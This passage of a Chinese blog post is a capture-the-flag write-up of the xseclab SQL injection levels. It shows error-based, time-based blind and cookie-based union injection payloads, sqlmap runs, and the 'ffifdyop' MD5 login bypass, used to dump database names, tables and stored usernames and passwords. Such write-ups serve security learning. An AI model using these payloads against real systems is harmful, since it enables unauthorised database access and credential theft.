+<p>//看数据库版本 5.1.73 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure> //看当前用户
+saeuser@220.181.129.121 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure> //当前数据库 mydbs <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+//爆库 information_schema, mydbs, test <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure> //爆表 log, motto,
+user <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure> //爆字段 id, username, password <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br><span class="line"></span><br><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+//读内容 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1)))%23</span><br></pre></td></tr></table></figure> //发现user表没有flag，读motto表
+key#notfound!#</p>
+<h2 id="盲注">7.盲注</h2>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/65f05e7cc957">盲注</a>分为两类：
+　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。
+　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值
+返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
+<p>先暴库，暴库的长度 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if(length(concat(database()))=5,sleep(2),1)--+&quot;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;SQLi4_article&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt; </span><br><span class="line">      &lt;div&gt;</span><br><span class="line">            &lt;h2&gt; &lt;/h2&gt;</span><br><span class="line">          &lt;div class=&quot;content&quot;&gt;username:admin&#x27;and if(length(concat(database()))=5,sleep(2),1)-- &lt;br&gt;status:ok &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">                </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">real	0m8.221s</span><br><span class="line">user	0m0.052s</span><br><span class="line">sys	0m0.164s</span><br></pre></td></tr></table></figure></p>
+<p>再逐一暴库的字符。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if(ascii(substr(concat(database()),1,1))&lt;110,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure> <code>m</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if(ascii(substr(concat(database()),2,1))&lt;122,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure>
+<p><code>y</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if(ascii(substr(concat(database()),3,1))&lt;100,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure>
+<p><code>d</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if(ascii(substr(concat(database()),4,1))&lt;98,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure>
+<p><code>a</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if(ascii(substr(concat(database()),5,1))&lt;116,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure>
+<p><code>s</code></p>
+<p>OK！数据库叫mydas。</p>
+<p>报表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29)=3,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure>
+<p>3个表。 逐一报表名。 暴露长度，并逐一暴露表名字符。 第一个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)=3,sleep(2),1)--+&quot;</span><br></pre></td></tr></table></figure>
+<p>长度3。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)&lt;108,sleep(2),1)--+&quot;</span><br><span class="line">l</span><br><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C2%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)&lt;112,sleep(2),1)--+&quot;</span><br><span class="line">o</span><br><span class="line"></span><br><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C3%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)&lt;104,sleep(2),1)--+&quot;</span><br><span class="line">g</span><br></pre></td></tr></table></figure>
+<p>NMB。 下一个。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)&lt;6,sleep(2),1)--+&quot;</span><br><span class="line">长度为5</span><br><span class="line"></span><br><span class="line"> time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)&lt;110,sleep(2),1)--+&quot;</span><br><span class="line">`m`</span><br><span class="line"></span><br><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C2%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)&lt;112,sleep(2),1)--+&quot;</span><br><span class="line">p</span><br><span class="line"></span><br><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C3%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)&lt;117,sleep(2),1)--+&quot;</span><br><span class="line">t</span><br><span class="line"></span><br><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C4%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)&lt;116,sleep(2),1)--+&quot;</span><br><span class="line">s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%202%2C1)&lt;5,sleep(2),1)--+&quot;</span><br><span class="line">长度为4</span><br><span class="line"></span><br><span class="line">time curl &quot;http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&#x27;and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%202%2C1)&lt;118,sleep(2),1)--+&quot;</span><br><span class="line">`u`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>烦死了，直接用SQLMAP跑吧。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin --current-db</span><br></pre></td></tr></table></figure></p>
+<pre><code>Parameter: username (GET)
+Type: AND/OR time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind
+Payload: username=admin&#39; AND SLEEP(5) AND &#39;Leyp&#39;=&#39;Leyp
+...
+current database:    &#39;mydbs&#39;</code></pre>
+<p>获取表。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin -D mydbs --tables</span><br></pre></td></tr></table></figure></p>
+<pre><code>Database: mydbs
+[3 tables]
++-------+
+| user  |
+| log   |
+| motto |
++-------+</code></pre>
+<p>获取<code>motto</code>的字段</p>
+<h2 id="sql注入通用防护">SQL注入通用防护</h2>
+<p>过滤了HTTP的GET和POST方法，头一次听说COOKIE注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1&quot; -H &quot;Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1&#x27;&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;SQLi8_article&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  mysql_fetch_row() expects parameter 1 to be resource, boolean given in &lt;b&gt;sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php&lt;/b&gt; on line &lt;b&gt;27&lt;/b&gt;&lt;br /&gt;
+        
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>那么接下来就是正常的注入过程。</p>
+<ul>
+<li>得到字段数目 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1&quot; -H &quot;Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=2 order by 4&quot;</span><br></pre></td></tr></table></figure> 字段数目为3。</li>
+<li>得到显示位 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1&quot; -H &quot;Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2,3&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>显示位为2，3</p>
+<ul>
+<li><p>获取当前数据库的表 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1&quot; -H &quot;Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br></pre></td></tr></table></figure>
+得到数据表为：<code>sae_manager_sqli8,sae_user_sqli8</code></p></li>
+<li><p>获取<code>sae_manager_sqli8</code>列名</p></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1&quot; -H &quot;Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2, group_concat(column_name) from information_schema.columns where table_name=&#x27;sae_manager_sqli8&#x27;&quot;</span><br></pre></td></tr></table></figure>
+<p>id,username,password</p>
+<ul>
+<li>获取数据</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1&quot; -H &quot;Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,username,password from sae_manager_sqli8 limit 1,1 &quot;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;SQLi8_article&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;      &lt;div&gt;
+            &lt;h2&gt;manager&lt;/h2&gt;
+            &lt;div class=&quot;content&quot;&gt;IamFlagCookieInject!&lt;/div&gt;
+        &lt;/div&gt;
+        
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2
+id="据说哈希后的密码是不能产生注入的">据说哈希后的密码是不能产生注入的</h2>
+<p>这关没有通过。。。 python关于md5的方法为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">s=&#x27;ffifdyop&#x27;</span><br><span class="line">d=hashlib.md5(s)</span><br><span class="line"></span><br><span class="line">d.hexdigest()</span><br><span class="line">Out[35]: &#x27;276f722736c95d99e921722cf9ed621c&#x27;</span><br><span class="line"></span><br><span class="line">d.digest()</span><br><span class="line">Out[36]: &quot;&#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&quot;</span><br></pre></td></tr></table></figure> ### 参考
+[1] <a
+target="_blank" rel="noopener" href="http://www.cnblogs.com/yyds/p/7072492.html">Python之数据加密与解密及相关操作（hashlib、hmac、random、base64、pycrypto）</a></p>
+<h2 id="参考网站">参考网站</h2>
+<p>[1] <a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/">SQL
+注入</a> [2] <a
+target="_blank" rel="noopener" href="http://blog.csdn.net/helloc0de/article/details/76142478">SQL注入教程——（三）简单的注入尝试</a>
+[3] <a
+target="_blank" rel="noopener" href="https://blog.spoock.com/2016/07/25/redtiger-writeup/">Redtiger
+Hackit Writeup</a> [4] <a
+target="_blank" rel="noopener" href="http://ph0rse.me/2017/07/29/RedTiger-libs-writeup/">RedTiger libs
+writeup</a></p>
+<h1 id="sqli-labs">sqli-labs</h1>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/08/04/vps/" rel="prev" title="搭建vps">
+                  <i class="fa fa-angle-left"></i> 搭建vps
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/08/06/crypto-docs/" rel="next" title="密码学EXM?">
+                  密码学EXM? <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
